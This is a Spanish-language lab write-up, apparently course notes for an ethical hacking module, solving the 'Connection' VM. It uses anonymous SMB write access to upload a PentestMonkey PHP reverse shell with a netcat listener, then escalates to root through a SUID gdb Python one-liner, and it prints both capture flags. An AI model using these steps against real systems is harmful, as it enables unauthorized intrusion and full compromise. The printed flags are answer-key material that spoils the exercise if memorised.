---
title: "🖥️ Máquina: Connection — Hacking Ético"
aliases:
  - Connection
  - Máquina Connection
  - VM Connection
  - Writeup Connection
tags:
  - ifct0109
  - hacking-etico
  - vms
  - linux
  - ctf
---

# 🖥️ Máquina: Connection

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Dificultad:** Conceptos Básicos  
> **Técnicas trabajadas:** Enumeración SMB · Subida de archivo malicioso · Reverse Shell (PHP) · Escalada de privilegios (SUID / gdb)  
> **Descripción:** En esta práctica exploraremos un servidor Linux que expone un servicio SMB con escritura anónima sobre la raíz del servidor web.
  Aprovecharemos ese acceso para subir una reverse shell PHP, obtener ejecución remota de código y escalar privilegios abusando del binario SUID gdb.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.7`
* **`RHOST` (Víctima / Connection):** Ej. `10.0.0.11`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Connection tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Comenzamos con un escaneo completo de puertos para descubrir qué servicios están activos en la máquina víctima:

```bash
nmap -sT -p- 10.0.0.11
```

> [!info] Resultado
> El escaneo revela cuatro puertos abiertos:
> · 22/tcp — SSH
> · 80/tcp — HTTP
> · 139/tcp — NetBIOS (SMB)
> · 445/tcp — SMB
> La presencia de los puertos 139 y 445 indica que hay un servicio Samba (SMB) activo, lo que puede ser un vector interesante si permite acceso anónimo o tiene recursos compartidos mal configurados.

Lanzamos un escaneo detallado para obtener versiones y más información sobre los servicios:

```bash
nmap -v -A -p22,80,139,445 10.0.0.11
```

> [!info] Resultado
> El escaneo confirma que el servidor corre Samba 4.9.5 sobre Debian.
> Destacamos que la firma de mensajes SMB está deshabilitada y que el acceso como guest está permitido, lo que sugiere que podríamos conectarnos de forma anónima.

---

## 📁 Fase 2: Enumeración SMB

Usamos smbclient con la opción -N (sin contraseña) y -L para listar los recursos compartidos disponibles en el servidor:

```bash
smbclient -N -L //10.0.0.11
```

> [!info] Resultado
> El login anónimo es exitoso y obtenemos la lista de recursos compartidos:
> · share — recurso de disco accesible
> · print$ — drivers de impresora (generalmente no accesible)
> · IPC$ — servicio IPC para comunicación entre procesos
> El recurso share es el más interesante. Su descripción indica que es un espacio para subir archivos, así que intentamos acceder.

Nos conectamos al recurso share de forma anónima para explorar su contenido:

```bash
smbclient -N //10.0.0.11/share
```

```bash
smb: \> ls
```

> [!info] Resultado
> Dentro del recurso encontramos una carpeta llamada html. El nombre es muy revelador: es muy probable que corresponda a la raíz del servidor web (/var/www/html en sistemas Debian/Ubuntu). Entramos a comprobarlo:

```bash
smb: \> cd html
```

```bash
smb: \html\> ls
```

> [!info] Resultado
> Podemos ver el contenido del directorio. Para confirmar que tenemos permisos de escritura sobre él, subimos un archivo de prueba cualquiera y comprobamos si es accesible desde el navegador:

```bash
smb: \html\> put hola.txt
```

```bash

```

> [!info] Resultado
> El archivo es accesible desde la web. Esto confirma que tenemos escritura directa sobre la raíz del servidor web, lo que nos permite subir y ejecutar código PHP en el servidor.

---

## 🐚 Fase 3: Reverse Shell

Aprovecharemos el acceso de escritura para subir una reverse shell en PHP. Usaremos la de PentestMonkey, que viene preinstalada en Kali en /usr/share/webshells/php/php-reverse-shell.php.

Primero hacemos una copia del archivo para editarla sin modificar el original:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
```

Abrimos el archivo con cualquier editor y modificamos las dos líneas que indican la IP y el puerto de nuestra máquina atacante:

```bash

```

> [!info] Resultado
> Es fundamental que estos valores coincidan exactamente con nuestra IP y el puerto en el que vamos a ponernos a la escucha, ya que la shell intentará conectarse a ellos en el momento de ser ejecutada.

Nos ponemos a la escucha con netcat antes de subir y activar la shell. Es importante hacerlo en este orden: primero escuchar, luego ejecutar:

```bash
nc -lvnp {{LPORT}}
```

Con netcat escuchando, subimos la shell al servidor web a través del recurso SMB:

```bash
smbclient -N //10.0.0.11/share
```

```bash
smb: \> cd html
```

```bash
smb: \html\> put shell.php
```

Ahora activamos la shell haciendo una petición HTTP al archivo que acabamos de subir:

```bash
curl http://10.0.0.11/shell.php
```

> [!info] Resultado
> En la terminal donde tenemos netcat escuchando recibiremos la conexión entrante y obtendremos una shell interactiva en el servidor como el usuario www-data, que es el usuario bajo el que corre el servidor web Apache/nginx.

Verificamos la identidad del usuario con el que hemos accedido:

```bash
id
```

> [!info] Resultado
> uid=33(www-data) gid=33(www-data) groups=33(www-data)

Nos movemos al directorio home del usuario del sistema y leemos la primera flag:

```bash
cd /home/connection
```

```bash
cat local.txt
```

> [!info] Resultado
> Primera flag obtenida: 3f491443a2a6aa82bc86a3cda8c39617

---

## 🚀 Fase 4: Escalada de privilegios

Buscamos binarios con el bit SUID activo. Recordamos que un binario SUID se ejecuta siempre con los privilegios de su propietario (root), lo que puede permitirnos escalar si ese binario admite la ejecución de comandos arbitrarios:

```bash
find / -user root -perm /4000 2>/dev/null
```

> [!info] Resultado
> Entre los resultados encontramos /usr/bin/gdb con el bit SUID activo. GDB es el depurador de GNU, una herramienta de desarrollo que normalmente no debería tener SUID. Sin embargo, al tenerlo, podemos abusar de su capacidad para ejecutar código Python embebido y lanzar una shell con privilegios de root.

gdb incluye un intérprete de Python integrado accesible mediante el comando python dentro de sus opciones. Usamos ese intérprete para llamar a os.execl, que reemplaza el proceso actual por una nueva shell. La opción -p de /bin/sh indica que debe preservar los privilegios efectivos del proceso (en este caso, root gracias al SUID). Las opciones -nx evitan que GDB cargue archivos de configuración que podrían interferir, y -ex ejecuta un comando directamente al arrancar:

```bash
/usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

> [!info] Resultado
> Obtenemos una shell como root. Lo verificamos:

```bash
whoami
```

> [!info] Resultado
> root

Leemos la flag final:

```bash
cat /root/proof.txt
```

> [!info] Resultado
> Flag de root: a7c6ea4931ab86fb54c5400204474a39

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
